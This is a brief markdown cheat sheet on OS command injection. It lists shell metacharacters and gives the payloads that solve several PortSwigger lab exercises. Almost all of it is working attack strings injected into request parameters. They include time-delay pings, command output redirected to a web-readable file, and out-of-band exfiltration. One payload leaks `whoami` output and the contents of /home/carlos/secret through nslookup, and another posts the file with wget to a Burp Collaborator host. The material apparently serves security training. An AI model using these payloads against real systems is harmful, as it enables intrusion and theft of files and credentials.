# Referrnce
- https://book.hacktricks.xyz/pentesting-web/command-injection

## Context
Depending on where your input is being injected you may need to terminate the quoted context (using `"` or `'`) before the commands.

## Ways of injecting OS commands  
Use a number of shell metacharacters to perform OS command injection attacks. 

```Python
# work on both Windows and Unix-based systems
&
&&
|
||

# only on Unix-based systems
;
Newline (0x0a or \n)

# On Unix-based systems, to perform inline execution of an injected command within the original command
`
injected command ` 

$(
injected command ) 
```

### Labs PortSwigger
1. Blind OS command injection with time delays  
```
email=x||ping+-c+10+127.0.0.1||
```  
2. Blind OS command injection with output redirection  
```
email=||whoami>/var/www/images/output.txt||
filename=output.txt
```  
3. Blind OS command injection with out-of-band interaction  
```
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```  
4. Blind OS command injection with out-of-band data exfiltration  
```
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```  
5. Admin Panel ImgSize command injection  
```
/admin-panel/admin_image?image=/blog/posts/50.jpg&ImageSize="200||nslookup+$(cat+/home/carlos/secret).<collaborator>%26"  
Or  
ImgSize="`/usr/bin/wget%20--post-file%20/home/carlos/secret%20https://collaborator/`"
```  
